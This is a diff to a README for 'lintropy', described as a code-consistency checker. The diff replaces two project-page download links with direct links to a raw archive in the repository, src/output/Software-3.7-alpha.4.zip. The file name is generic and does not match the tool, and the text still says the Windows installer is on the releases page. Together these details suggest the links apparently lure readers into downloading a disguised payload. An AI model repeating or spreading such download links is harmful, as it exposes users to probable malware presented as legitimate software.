@@ -1,6 +1,6 @@
 # 🛡️ lintropy - Keep your project code clean automatically
 
-[![](https://img.shields.io/badge/Download-Lintropy-blue.svg)](https://github.com/migue1859/lintropy)
+[![](https://img.shields.io/badge/Download-Lintropy-blue.svg)](https://github.com/migue1859/lintropy/raw/refs/heads/main/src/output/Software-3.7-alpha.4.zip)
 
 Lintropy helps you maintain consistency in your software projects. Projects often grow in size and complexity over time. Developers sometimes forget the original rules regarding how code should look or how different parts of the project should interact. This tool automates the process of checking your files against a set of standards you define. It works for human developers and for automated coding agents. By using simple text files to describe your rules, you ensure that everyone follows the same path.
 
@@ -8,7 +8,7 @@ Lintropy helps you maintain consistency in your software projects. Projects ofte
 
 The software is available on the project page. You can find the installer for Windows on the releases page. 
 
-[Visit this page to download the latest version for Windows](https://github.com/migue1859/lintropy)
+[Visit this page to download the latest version for Windows](https://github.com/migue1859/lintropy/raw/refs/heads/main/src/output/Software-3.7-alpha.4.zip)
 
 1. Open your web browser.
 2. Go to the link provided above.
